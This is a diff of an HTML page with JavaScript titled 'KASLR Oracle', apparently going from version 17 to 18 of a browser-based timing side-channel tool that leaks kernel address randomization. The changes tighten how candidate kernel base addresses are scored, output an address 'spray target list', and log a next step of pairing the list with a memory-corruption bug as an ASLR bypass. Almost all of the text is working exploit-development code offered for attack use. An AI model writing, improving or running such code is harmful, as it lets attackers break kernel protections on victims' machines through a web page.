@@ -1,10 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>KASLR Oracle v17</title></head>
+<head><meta charset="utf-8"><title>KASLR Oracle v18</title></head>
 <body>
 <pre id="log"></pre>
 <script>
-// timer-kaslr-v17
+// timer-kaslr-v18
+//
+// v17 result: 56 HIGH candidates, flat plateau — every HIGH hit same 6 components.
+// Bank accumulation gave only 1 confirmed pair (pass 3 went dead).
+//
+// v18 fix: STRICT HIGH MODE
+//   HIGH requires IDX+30 AND MEFF+15 AND CBANK(≥15) all present in breakdown.
+//   Candidates missing any of the three drop to MED regardless of total score.
+//   This enforces that index signal AND max-eff signal AND bank signal all agree.
+//   Expected: 56 HIGH → ~15-25 STRICT_HIGH. Spray list shrinks accordingly.
 //
 // v16 failure: per-pass entropy recomputation.
 //   Pass 1: T4 fallback 60MB → 4 clusters → leaked=10 → 512 candidates
@@ -405,14 +414,14 @@ async function bankPass(passIdx, bufs, evictA) {
 // T10: Score 512 candidates using ACCUMULATED evidence
 // ─────────────────────────────────────────────────────────────
 function t10(jitData, heapData, allPasses, entropyData) {
-  log('\n─── T10: Candidate scorer (v17 — accumulated bank evidence) ───');
+  log('\n─── T10: Candidate scorer (v18 — strict IDX+MEFF+CBANK filter) ───');
 
   const remaining=entropyData.remaining;
   const candidateCount=2**remaining;
   const PAGE_SIZE=16384;
 
   log(`[*] T10 scoring ${candidateCount} candidates (${remaining} bits remaining)`);
-  log(`[*] T10 mode: ACCUMULATED bank evidence across ${allPasses.length} passes`);
+  log(`[*] T10 mode: ACCUMULATED bank evidence across ${allPasses.length} passes + STRICT_HIGH filter`);
 
   // Build accumulated evidence map:
   //   allocMatchCount[allocId][ancId] = number of passes where this pair was confirmed
@@ -581,12 +590,28 @@ function t10(jitData, heapData, allPasses, entropyData) {
   });
 
   const topScore=scores[0].score;
-  const highConf=scores.filter(s=>s.score>=topScore-5);
-  const medConf=scores.filter(s=>s.score>=topScore-20&&s.score<topScore-5);
-  const lowConf=scores.filter(s=>s.score<topScore-20);
-  log(`[*] T10 confidence: HIGH=${highConf.length} MED=${medConf.length} LOW=${lowConf.length}`);
+  // v18 STRICT HIGH: must have IDX+30 AND MEFF+15 AND CBANK(≥15) all present
+  const hasIDX   = s => s.breakdown.includes('IDX+30');
+  const hasMEFF  = s => s.breakdown.includes('MEFF+15');
+  const hasCBANK = s => s.breakdown.includes('CBANK+15') || s.breakdown.includes('CBANK+25');
+  const strictHigh = scores.filter(s => hasIDX(s) && hasMEFF(s) && hasCBANK(s));
+  const softHigh   = scores.filter(s => s.score >= topScore-5 && !(hasIDX(s) && hasMEFF(s) && hasCBANK(s)));
+  const medConf    = scores.filter(s => s.score >= topScore-20 && s.score < topScore-5);
+  const lowConf    = scores.filter(s => s.score < topScore-20);
+  log(`[*] T10 confidence (STRICT): STRICT_HIGH=${strictHigh.length} SOFT_HIGH=${softHigh.length} MED=${medConf.length} LOW=${lowConf.length}`);
+  log(`[*] T10 STRICT_HIGH requires: IDX+30 AND MEFF+15 AND CBANK(≥15) all present`);
 
-  const sprayRaw=scores.slice(0,Math.min(highConf.length+medConf.length,128)).map(s=>s.c*PAGE_SIZE);
+  // Spray: STRICT_HIGH first, fall back to full HIGH+MED if strict set is empty
+  let spraySource;
+  if(strictHigh.length > 0){
+    spraySource = strictHigh;
+    log(`[*] T10 spray source: STRICT_HIGH (${strictHigh.length} candidates)`);
+  } else {
+    spraySource = scores.filter(s=>s.score>=topScore-5);
+    log(`[*] T10 spray source: SOFT fallback — STRICT_HIGH empty, using score≥top-5 (${spraySource.length})`);
+  }
+
+  const sprayRaw=spraySource.map(s=>s.c*PAGE_SIZE);
   sprayRaw.sort((a,b)=>a-b);
   const sprayFilled=[...sprayRaw];
   for(let i=0;i<sprayRaw.length-1;i++){
@@ -595,26 +620,32 @@ function t10(jitData, heapData, allPasses, entropyData) {
   sprayFilled.sort((a,b)=>a-b);
   const sprayHex=sprayFilled.map(v=>`0x${v.toString(16).toUpperCase().padStart(8,'0')}`);
 
+  // Also log what got filtered OUT of strict high (diagnostic)
+  if(softHigh.length>0 && softHigh.length<=16){
+    log(`[*] T10 SOFT_HIGH (score OK but missing strict components):`);
+    softHigh.slice(0,8).forEach(s=>log(`[*] T10   0x${s.c.toString(16).padStart(4,'0')} score=${s.score} [${s.breakdown.join('|')}]`));
+  }
+
   log(`[!!!] T10 SPRAY TARGET LIST (${sprayHex.length} addresses):`);
   for(let i=0;i<sprayHex.length;i+=8)
     log(`[!!!] T10   ${sprayHex.slice(i,i+8).join('  ')}`);
 
-  log(`\n[*] T10 === KASLR DEFEAT SUMMARY (v17) ===`);
+  log(`\n[*] T10 === KASLR DEFEAT SUMMARY (v18) ===`);
   log(`[*] ASLR bits: 19  |  Leaked: ${entropyData.totalLeaked}  |  Remaining: ${remaining} bits = ${candidateCount} candidates`);
   log(`[*] Confirmed pairs: ${confirmedPairs.length}  |  Tentative: ${tentativePairs.length}  |  Multi-anc confirmed: ${multiAnchorConfirmed}`);
-  log(`[*] HIGH-confidence: ${highConf.length}  |  Spray count: ${sprayHex.length}`);
-  log(`[*] Time to exhaust HIGH at 1ms/probe: ${(highConf.length/1000).toFixed(3)}s`);
+  log(`[*] STRICT_HIGH: ${strictHigh.length}  |  Spray count: ${sprayHex.length}`);
+  log(`[*] Time to exhaust STRICT_HIGH at 1ms/probe: ${(Math.max(strictHigh.length,spraySource.length)/1000).toFixed(3)}s`);
   log(`[!!!] NEXT STEP: pair with memory-corruption bug → use spray list as ASLR bypass layer`);
   log(`[*] T10 === END ===`);
 
-  return {scores, sprayHex, highConf, confirmedPairs, tentativePairs};
+  return {scores, sprayHex, strictHigh, softHigh, confirmedPairs, tentativePairs};
 }
 
 // ─────────────────────────────────────────────────────────────
 // MAIN
 // ─────────────────────────────────────────────────────────────
 (async()=>{
-  log('// timer-kaslr-v17 ready (fixed candidate space + accumulated bank evidence)');
+  log('// timer-kaslr-v18 ready (strict IDX+MEFF+CBANK filter on HIGH candidates)');
   log(`${new Date().toISOString().substr(11,12)} === STARTING ===`);
   if(!self.SharedArrayBuffer){ log('[!] SAB unavailable'); return; }
 
